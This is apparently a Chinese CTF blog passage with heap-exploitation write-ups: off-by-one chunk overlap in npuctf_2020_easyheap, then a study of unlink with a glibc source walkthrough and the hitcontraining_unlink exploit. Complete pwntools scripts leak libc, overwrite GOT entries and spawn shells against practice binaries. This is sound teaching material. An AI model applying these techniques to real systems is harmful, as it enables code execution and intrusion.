class="number">0x60</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x100</span>)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">write(<span class="number">1</span>,<span class="number">114</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">malloc_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#realloc_addr=libc_base_addr+libc.symbols[&#x27;realloc&#x27;]</span></span><br><span class="line">realloc_addr=libc_base_addr+<span class="number">0x846c0</span></span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=<span class="number">0xb</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">16</span>)<span class="comment">#p64(one_gadget)</span></span><br><span class="line">write(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xccc)</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007205137521.png" alt="image-20221007205137521"></p>
<blockquote>
<p> 这道题考察的off by one，但是跟以往用off by one来让堆块合并制造堆块重叠的方式不同。这道题由于限制了申请堆块的大小，让chunk释放之后无法进入unsorted bin (这就意味着堆块无法触发合并)。所以采用伪造size，然后直接释放将其造成堆块重叠。</p>
</blockquote>
<h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007205201197.png" alt="image-20221007205201197"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/../img/image-20221007205223694.png" alt="image-20221007205223694"></p>
<p>在edit函数中，<u>输入的数据比申请的chunk范围大了一个字节。然后创建堆块的时候发现只能创建0x18或者0x38的堆块，这正好是off by one利用的前提</u>（如下图）。</p>
<p><img src="/../img/image-20221007205233601.png" alt="image-20221007205233601"></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于申请的堆块都属于tcachebin的范围，释放掉之后也无法进行合并。所以我们不往制造堆块合并那个方向考虑。<strong>这道题的特殊性是存在指针堆块（就是程序自己申请了一个堆块，里面存放了我们申请堆块的指针）</strong>，像这种题目我们通常采用篡改指针堆块里存放的指针，而且通常是用互换指针堆块和用户堆块的方法。</p>
<p>以这道题为例，我们申请两个堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x18,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x18,&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>

<p>将第一个堆块当做溢出堆块，然后去改变第二个指针堆块的size，将其size位改为0x41。</p>
<blockquote>
<p>为什么要改成0x41?</p>
<p>因为我们只能申请0x18和0x38两种大小的堆块，如果申请0x18那么得到的就是0x20大小的堆块，和指针堆块一样大，那还怎么堆块重叠呢？所以我们只能申请0x38大小的堆块，得到的是0x40大小的堆块，我们将第二个指针堆块的size位改为0x41之后，再申请一个0x38大小的堆块，就会把原本指针堆块的位置申请回来(因为它的大小被伪造成了0x41)当做用户堆块，那么此时真正的指针堆块就和用户堆块造成了重叠(如下图)</p>
<p>PS:用户堆块我指的是自己申请的堆块，指针堆块是程序自己申请的那个堆块</p>
</blockquote>
<p><img src="/../img/image-20221007205244060.png" alt="image-20221007205244060"></p>
<p>然后申请一个0x38大小的堆块，就造成了堆块重叠。然后思路就是往用户堆块写入数据，覆写指针堆块里的指针将其改完free函数的got表，然后进行泄露得到libc地址。然后再用edit函数覆写edit函数的got表为system的地址，最后释放掉一个存有&#x2F;bin&#x2F;sh字符串的堆块即可获取shell、。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27557</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">     </span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400E9f)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x38</span>)+p64(free_got_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;free_addr&#x27;</span>)</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;free&#x27;,free_addr,libc)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug(p,0x400D81)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007205307506.png" alt="image-20221007205307506"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/afa5cfa3.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/afa5cfa3.html" class="post-title-link" itemprop="url">关于unlink的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:48:22" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>关于unlink的学习总结，<strong>我打算分成4个部分来说明，分别是unlink的利用整体思路、如何伪造fake_chunk、探究下unlink漏洞是如何实现的、相关题目的WP</strong>。我这篇博客并没有画图片来说明unlink的操作，我认为不是特别适合完全不懂unlink的师傅来参考学习，建议去看一些其他师傅一些画图说明unlink的博客，对unlink有个模糊的认识后，再看这篇文章应该效果最好</p>
<h2 id="对unlink的总结："><a href="#对unlink的总结：" class="headerlink" title="对unlink的总结："></a>对unlink的总结：</h2><p>1、unlink的整体利用思路为</p>
<p>①、利用溢出伪造fake_chunk</p>
<p>②、free掉引线堆块（也就是被溢出修改prev_size和size的chunk），从而触发unlink（注意chunk别跟top chunk合并了），同时引线堆块的大小一定要大于等于0x80，避免被free掉给放进了fastbin中。</p>
<p>③、最后效果为fake_chunk的地址改为&amp;P-0x18 </p>
<p>④、通过edit功能修改bss段存放的chunk信息，进行泄露函数真实地址以及篡改函数的got表，从而获取shell。</p>
<p>2、fake_chunk未必非要和引线堆块相邻，只要让引线堆块的地址减去自身的prev_size可以找到fake_chunk即可</p>
<blockquote>
<p>什么时候考虑unlink？ 目前以我做题的情况来看，通常不开PIE，并且存在堆溢出的时候，是可以考虑unlink的。</p>
</blockquote>
<h2 id="构造fake-chunk"><a href="#构造fake-chunk" class="headerlink" title="构造fake_chunk"></a>构造fake_chunk</h2><p>利用unlink之前，要构造好fake_chunk（这个chunk并不是申请出来的，而是写入精心构造的数据伪造的chunk）为之后的unlink做铺垫，这个fake_chunk有三个关键部分。</p>
<p>第一、fake_chunk需要伪造自己的prev_size和size（这个prev_size填充成0即可），size位最小为0x20（因为要装fd和bk还要溢出下个chunk的prev_size和size）同时size需要与下一个chunk的prev_size位保持一致（PREV_INUSE位最好为1)。</p>
<p>第二、fake_chunk(这个fake_chunk要构造成释放状态的,这样fd和bk才有意义)的fd和bk设置成&amp;fake_chunk-0x18和&amp;fake_chunk-0x10。（这里指的&amp;fake_chunk,就是bss段上存放chunk的地址）</p>
<p>第三、要将下一个chunk(相当于写入数据的chunk来说，我习惯将高地址的chunk称为下)的prev_size和size进行溢出修改，prev_size要修改为fake_chunk的大小（如果fake_chunk没有和下一个chunk相邻，那么需要保证下一个chunk的地址减去prev_size的值，正好可以找到fake_chunk），而size就是写成原本这个chunk的大小，但是PREV_INUSE位要改写成0（用来声明上一个堆块是free状态）。</p>
<p>然后free掉高地址的chunk，此时程序检测到了这个堆块的PREV_INUSE为0，就会认为上一个堆块处于free状态，然后就会触发unlink将高地址的chunk和上一个chunk合并，<strong>它怎么去找到上一个chunk的起始位置呢？它会用当前chunk的地址减去prev_size的大小找到上一个chunk的位置，但是prev_size已经被修改成了fake_size的大小，因此当前chunk的地址减去prev_size大小误把fake_chunk当做了上一个chunk</strong>，然后进行unlink操作。</p>
<h2 id="探究unlink漏洞是如何产生的"><a href="#探究unlink漏洞是如何产生的" class="headerlink" title="探究unlink漏洞是如何产生的"></a>探究unlink漏洞是如何产生的</h2><p>下面是unlink的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);			      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);			      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后下面是将源码的关键部分提取出来了</p>
<p>unlink宏的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br></pre></td></tr></table></figure>

<p>unlink中上来直接执行的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;								      </span><br><span class="line">BK = P-&gt;bk;	</span><br></pre></td></tr></table></figure>

<p>if要检查（满足下面的条件，则可以通过if）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk == P || BK-&gt;fd == P</span><br></pre></td></tr></table></figure>

<p>通过检查后，执行的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;							      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>程序是怎么找到fd和bk指针的？ 答：靠偏移，而这就给了我们伪造fd和bk的机会</p>
</blockquote>
<p>以 <code>FD-&gt;bk ==P</code>为例(64位程序），它就等价于*(FD+0x18)&#x3D;&#x3D;P  (<strong>请注意这里是存在*()的，这里不明白的可以去学习一下C语言的指针</strong>) (0x18是因为bk指针距离堆块的起始地址有三个内存单元大小的偏移，64位程序中内存单元的大小为0x8)</p>
<blockquote>
<p>因为FD&#x3D;P-&gt;fd，如果我们可以通过溢出来控制P-&gt;fd，就意味着我们控制了FD的值，考虑一下FD的值应该是什么，才能满足这个等式<code>*(FD+0x18)==P</code> </p>
<p>答案是 FD应该为 <code>&amp;P-0x18</code> 才能满足上述等式，代换进去的式子就是这个   *(&amp;P+0x18-0x18)&#x3D;&#x3D;P  ，因此通过了检查</p>
</blockquote>
<p>以此类推，我们让BK的值写成&amp;P-0x10，也就可以绕过检查。</p>
<p>先捋一下，我们现在是利用溢出的方式将P-&gt;fd (也就是FD) 和P-&gt;bk (也就是BK)分别修改为了 <code>&amp;P-0x18</code> 和 <code>&amp;P-0x10</code>  ,而我们刚刚通过了if的检查，因此现在 <code>FD-&gt;bk ==P</code> <code> BK-&gt;fd == P</code>(接下来要进行等量代换，因此这些值要记住)</p>
<p>接下来执行的是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;							      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<p>将刚刚说过的值进行等量代换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk=BK &lt;==&gt; P=&amp;P<span class="number">-0x10</span></span><br><span class="line">BK-&gt;fd=FD &lt;==&gt; P=&amp;P<span class="number">-0x18</span></span><br></pre></td></tr></table></figure>

<p>因为是先执行FD-&gt;bk&#x3D;BK 后执行的BK-&gt;fd&#x3D;FD，也就是等同于先执行的P&#x3D;&amp;P-0x10，后执行的P&#x3D;&amp;P-0x18。 <strong>所以最后P的值等于&amp;p-0x18</strong></p>
<p>&amp;P是啥？它是P的地址，因此&amp;P指向了P。</p>
<p><img src="/../img/2706180-20220625220421408-1786229210.png"></p>
<p>我们在bss段发现了&amp;P （0x1cf9030是P）</p>
<p>补充：由于bss段上记录了申请的chunk所在的位置，换句话说，我们申请的chunk在哪，是由bss段上记录的信息说了算。bss段是怎么记录信息的？就是用指针的方式来记录的，bss段中的内存单元中存放的就是chunk的地址，也就是说bss段上某个地址指向了申请chunk的地址（这里指的是chunk的用户地址）。</p>
<p>最后用两句话来说一下利用unlink漏洞的条件和unlink漏洞产生的效果。</p>
<blockquote>
<p>利用条件：利用溢出伪造一个fake_chunk，然后free掉高地址的那个堆块，触发unlink</p>
<p>利用后效果：最后将fake_chunk的地址（也就是P的值）修改为&amp;P-0x18，之后再往P写入数据，就可以修改bss段上存储的chunk信息了。</p>
</blockquote>
<h2 id="实战unlink"><a href="#实战unlink" class="headerlink" title="实战unlink"></a>实战unlink</h2><h3 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a>hitcontraining_unlink</h3><h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/2706180-20220625220447316-229285179.png"></p>
<h4 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h4><p>2.23的libc，如果不想手动patch libc的话，可以试试我写的小工具 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16243431.html">patchtup</a>。它可以自动patch 指定的libc。（效果如下）<br><img src="/../img/2706180-20220625220544926-1942268274.png"></p>
<p>一个菜单题，同时发现了后门。<br><img src="/../img/2706180-20220625220718870-1959637132.png"></p>
<p>不过根据以往的情况来看，在buu上的题目flag应该不会在这个位置，但总要尝试一下的。</p>
<p>程序的漏洞点在change_item函数里面，发现没有对写入数据的大小做检查，导致了此处可以溢出。</p>
<p><img src="/../img/2706180-20220625220754639-1966501539.png"></p>
<p>同时还发现了个函数指针，下面是它被调用的地方。</p>
<p><img src="/../img/2706180-20220625220844769-1910492971.png"></p>
<p>而这个指针定义在这里（下图），好巧不巧，这个指针又存在一个程序自己分配的堆块上。</p>
<p><img src="/../img/2706180-20220625221003445-87496987.png"></p>
<h4 id="大致思路（没用unlink的方法）："><a href="#大致思路（没用unlink的方法）：" class="headerlink" title="大致思路（没用unlink的方法）："></a>大致思路（没用unlink的方法）：</h4><p>考虑到有后门函数，同时没开PIE，这个后门函数是可以直接用的，这道题是2.23的libc，因此free掉的小堆块直接进fastbin里了。思路也比较简单，利用溢出篡改fd指针，将fd指针改成程序刚开始申请的chunk地址（这个chunk是存放的函数指针），再将这个堆块申请过来，此时我们就可以对这个堆块进行编辑了，直接篡改函数指针为后门函数的地址。最后选择5，执行一下后门函数即可</p>
<p>不过最后打远程的时候，flag确实不在那个位置。我在本地建了个flag文件，确实是可以读出来信息的。</p>
<p><img src="/../img/2706180-20220625221102782-492232474.png"></p>
<h4 id="使用后门函数的exp"><a href="#使用后门函数的exp" class="headerlink" title="使用后门函数的exp"></a>使用后门函数的exp</h4><p>这个的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x400A6F\nb *0x400CDD\nc&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;下面这三行代码是我用来tmux分三屏的，不需要的话注释即可&quot;&quot;&quot;</span></span><br><span class="line">os.system(<span class="string">&#x27;tmux select-pane -L&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux split-window&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux set mouse on&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the name of item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400D49</span></span><br><span class="line">payload1=p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)<span class="comment">#添加0x21的目的是为了通过fastbin中的检查</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">change(<span class="string">&#x27;0&#x27;</span>,<span class="number">0x20</span>,payload1)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">add(<span class="number">0x10</span>,payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面这个思路非常简单，简单到我这个刚刚接触堆的菜鸡都感觉没必要写过程了，我就简单记录下我当时思考的三个“蠢”问题吧。</p>
<blockquote>
<p>最开始的存放函数指针的堆块已经存在了，为什么要再把这个堆块申请一次？</p>
<p>答：因为最开始这个堆块并不在记录的堆块索引中，换句话说我们无法去编辑这个堆块（因为没有它的索引），但是我们申请的堆块是都有索引的，因此需要再把存在函数指针的堆块申请一次。</p>
</blockquote>
<blockquote>
<p>为啥不能直接把fd指针改成后门函数的地址，然后直接申请回来？</p>
<p>第一没意义，第二malloc从fastbin中申请的堆块会进行一个检查（判断我们需要堆块的大小是否等于该fastbin中的堆块大小），这个检查过不了，因为fastbin这个里面的chunk是通过修改fd指针来伪造的，取对应size的时候肯定是有问题的</p>
</blockquote>
<blockquote>
<p>咋把fd指针改成第一个chunk的地址？</p>
<p>先申请三个堆块，把第一个堆块（是我们主动申请的第一个堆块，不是程序自己申请的堆块）当作溢出堆块，然后分别释放第二个堆块和第三个堆块，从而让fastbin中出现两个空闲堆块，此时的第二个堆块的fd指针指向了第三个堆块的地址。最后发现每次程序自己申请的那个堆块末尾都是00，因此我们只需要把第二个堆块的fd指针末尾写成00即可。考虑到程序会在我们输入的末尾加个00，因此我们只需要写入0x20字节的数据（用send发送），00自动就写入进去了。</p>
</blockquote>
<h4 id="大致思路（使用unlink"><a href="#大致思路（使用unlink" class="headerlink" title="大致思路（使用unlink)"></a>大致思路（使用unlink)</h4><p>在show函数中，printf %s打印的信息是bss段存放的地址所指向的数据。可是现在我们已经可以去修改bss段存放的地址了，那只需要让bss段上存一个函数的got表，那么执行show即可进行泄露函数的真实地址。</p>
<p><img src="/../img/2706180-20220625221127777-789320050.png"></p>
<p>在change函数中，read写入的是bss段存放的地址所指向的信息，我们已经可以去修改bss段存放的地址，因此在bss段上存一个函数的got表，那么在执行change的时候，就可以修改函数的got表。</p>
<p><img src="/../img/2706180-20220625221256721-137146817.png"></p>
